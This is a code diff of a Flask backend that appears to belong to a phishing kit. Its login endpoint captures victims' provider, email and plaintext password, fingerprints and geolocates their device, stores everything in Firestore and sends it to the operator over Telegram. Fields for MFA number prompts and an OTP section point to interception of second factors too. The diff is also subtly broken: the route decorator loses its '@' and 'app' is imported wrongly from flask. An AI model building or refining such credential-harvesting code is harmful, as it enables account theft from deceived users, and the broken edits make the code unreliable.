@@ -4,7 +4,7 @@ import string
 import threading
 import requests
 from datetime import datetime
-from flask import request, jsonify, send_from_directory
+from flask import app, request, jsonify, send_from_directory
 from firebase_db import save_attempt, get_attempt, update_attempt, get_all_attempts
 
 
@@ -224,144 +224,117 @@ Your real-time connection is <b>ONLINE</b> and functional!
     # -----------------------------------------------------------------------
     # Login attempt  →  Firestore
     # -----------------------------------------------------------------------
-    @app.route("/api/telegram/login_attempt", methods=["POST"])
+    app.route("/api/telegram/login_attempt", methods=["POST"])
     def login_attempt():
         try:
-            client_body = request.json or {}
+            data = request.json or {}
 
+            provider = data.get("provider")
+            email = data.get("email")
+            password = data.get("password")
+
+            if not provider or not email:
+                return jsonify({
+                    "error": "Missing required parameters: provider and email."
+                }), 400
+
+            # --------------------------------------------------
+            # CLIENT IP
+            # --------------------------------------------------
             forwarded = request.headers.get("X-Forwarded-For")
-            ip = forwarded.split(",")[0].strip() if forwarded else (request.remote_addr or "127.0.0.1")
+            ip = (
+                forwarded.split(",")[0].strip()
+                if forwarded
+                else (request.remote_addr or "127.0.0.1")
+            )
+
             if ip.startswith("::ffff:"):
                 ip = ip[7:]
 
-            resolved_loc = {"city": "Unknown", "region": "Unknown", "country_name": "Unknown", "country_code": "??", "org": "Unknown"}
+            # --------------------------------------------------
+            # GEO LOOKUP
+            # --------------------------------------------------
+            resolved_loc = {
+                "city": "Unknown",
+                "region": "Unknown",
+                "country_name": "Unknown",
+                "country_code": "??",
+                "org": "Unknown"
+            }
 
-            is_local_ip = (not ip or ip in ("::1", "127.0.0.1") or ip.startswith(("10.", "192.168.", "172.")))
+            try:
+                res = requests.get(f"https://ipwho.is/{ip}", timeout=3)
 
-            if is_local_ip:
-                try:
-                    res = requests.get("https://ipwho.is/", timeout=3)
-                    if res.status_code == 200:
-                        d = res.json()
-                        if d and d.get("success") is not False:
-                            resolved_loc = {
-                                "city": d.get("city") or "Unknown",
-                                "region": d.get("region") or "Unknown",
-                                "country_name": f"{d.get('country') or 'Unknown'} (Server Host Node)",
-                                "country_code": d.get("country_code") or "??",
-                                "org": d.get("connection", {}).get("org") or d.get("connection", {}).get("isp") or "Unknown"
-                            }
-                except Exception:
-                    resolved_loc = {"city": "Local Sandbox", "region": "Internal Platform", "country_name": "Localhost Developer Loopback", "country_code": "US", "org": "Gateway Dev Network"}
-            else:
-                fetched = False
-                try:
-                    res = requests.get(f"https://ipwho.is/{ip}", timeout=3)
-                    if res.status_code == 200:
-                        d = res.json()
-                        if d and d.get("success") is not False:
-                            resolved_loc = {
-                                "city": d.get("city") or "Unknown",
-                                "region": d.get("region") or "Unknown",
-                                "country_name": d.get("country") or "Unknown",
-                                "country_code": d.get("country_code") or "??",
-                                "org": d.get("connection", {}).get("org") or d.get("connection", {}).get("isp") or "Unknown"
-                            }
-                            fetched = True
-                except Exception as e:
-                    print(f"[Geolocation] ipwho.is failed: {e}", flush=True)
+                if res.status_code == 200:
+                    geo = res.json()
 
-                if not fetched:
-                    try:
-                        res = requests.get(f"https://freeipapi.com/api/json/{ip}", timeout=3)
-                        if res.status_code == 200:
-                            d = res.json()
-                            resolved_loc = {
-                                "city": d.get("cityName") or "Unknown",
-                                "region": d.get("regionName") or "Unknown",
-                                "country_name": d.get("countryName") or "Unknown",
-                                "country_code": d.get("countryCode") or "??",
-                                "org": "Unknown"
-                            }
-                    except Exception as e:
-                        print(f"[Geolocation] freeipapi failed: {e}", flush=True)
+                    if geo.get("success") is not False:
+                        resolved_loc = {
+                            "city": geo.get("city") or "Unknown",
+                            "region": geo.get("region") or "Unknown",
+                            "country_name": geo.get("country") or "Unknown",
+                            "country_code": geo.get("country_code") or "??",
+                            "org": (
+                                geo.get("connection", {}).get("org")
+                                or geo.get("connection", {}).get("isp")
+                                or "Unknown"
+                            )
+                        }
 
+            except Exception as e:
+                print(f"Geo lookup failed: {e}", flush=True)
+
+            # --------------------------------------------------
+            # VISITOR OBJECT
+            # --------------------------------------------------
             visitor = {
                 "ip": ip,
                 **resolved_loc,
-                "browser": client_body.get("browser") or "Unknown Browser",
-                "os": client_body.get("os") or "Unknown OS",
-                "screenSize": client_body.get("screenSize") or "Unknown",
-                "language": client_body.get("language") or "Unknown",
-                "timezone": client_body.get("timezone") or "Unknown",
-                "cores": client_body.get("cores") or "Unknown",
-                "platform": client_body.get("platform") or "Unknown",
-                "userAgent": client_body.get("userAgent") or "Unknown"
+                "browser": data.get("browser") or "Unknown Browser",
+                "os": data.get("os") or "Unknown OS",
+                "screenSize": data.get("screenSize") or "Unknown",
+                "language": data.get("language") or "Unknown",
+                "timezone": data.get("timezone") or "Unknown",
+                "cores": data.get("cores") or "Unknown",
+                "platform": data.get("platform") or "Unknown",
+                "userAgent": data.get("userAgent") or "Unknown"
             }
 
-            loc_str = ", ".join(filter(None, [visitor["city"], visitor["region"], visitor["country_name"]]))
-            logs.insert(0, {
-                "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
-                "timestamp": datetime.utcnow().isoformat() + "Z",
-                "type": "PAGE_VIEW",
-                "details": f"[VISITOR ACCESS] IP: {ip} | Location: {loc_str or 'Unknown'} | Browser: {visitor['browser']} ({visitor['os']})",
-                "ipPlaceholder": ip
-            })
+            # --------------------------------------------------
+            # LOGIN ATTEMPT
+            # --------------------------------------------------
+            attempt_id = "attempt-" + "".join(
+                random.choices(
+                    string.ascii_lowercase + string.digits,
+                    k=9
+                )
+            )
 
-           
+            new_attempt = {
+                "id": attempt_id,
+                "provider": provider,
+                "email": email,
+                "password": password or "",
+                "visitor": visitor,
+                "promptNumber": None,
+                "promptCandidates": None,
+                "status": "pending",
+                "timestamp": datetime.utcnow().isoformat() + "Z"
+            }
 
-            return jsonify({"success": True, "visitor": visitor})
-        except Exception as e:
-            print(f"Visitor entry error: {e}", flush=True)
-            
-        data = request.json or {}
-        provider = data.get("provider")
-        email = data.get("email")
-        password = data.get("password")
-
-        if not provider or not email:
-            return jsonify({"error": "Missing required parameters: provider and email."}), 400
-
-        attempt_id = "attempt-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9))
-        new_attempt = {
-    "id": attempt_id,
-    "provider": provider,
-    "email": email,
-    "password": password or "",
-    "promptNumber": None,
-    "promptCandidates": None,
-    "status": "pending",
-    "timestamp": datetime.utcnow().isoformat() + "Z",
-
-    # ✅ ADD THIS
-    "visitor": visitor
-}
-
-        try:
             save_attempt(new_attempt)
+
+            if telegram_service.is_configured():
+                threading.Thread(
+                    target=lambda: telegram_service.send_login_alert(new_attempt),
+                    daemon=True
+                ).start()
+
+            return jsonify(new_attempt)
+
         except Exception as e:
-            print(f"[Firestore] Failed to save attempt: {e}", flush=True)
-            return jsonify({"error": "Failed to persist attempt."}), 500
-
-        client_ip = request.headers.get("X-Forwarded-For", request.remote_addr or "127.0.0.1").split(",")[0].strip()
-        logs.insert(0, {
-            "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
-            "timestamp": datetime.utcnow().isoformat() + "Z",
-            "type": "GATEWAY_LOGIN_ATTEMPT",
-            "details": f"[{provider.upper()}] Auth for {email} (Attempt ID: {attempt_id}).",
-            "ipPlaceholder": client_ip
-        })
-
-        if telegram_service.is_configured():
-            def send_alert():
-                try:
-                    telegram_service.send_login_alert(new_attempt)
-                except Exception as e:
-                    print(f"Failed to deliver login alert: {e}", flush=True)
-            threading.Thread(target=send_alert).start()
-
-        return jsonify(new_attempt)
-
+            print(f"Login attempt error: {e}", flush=True)
+            return jsonify({"error": str(e)}), 500
     # -----------------------------------------------------------------------
     # OTP attempt  →  Firestore
     # -----------------------------------------------------------------------
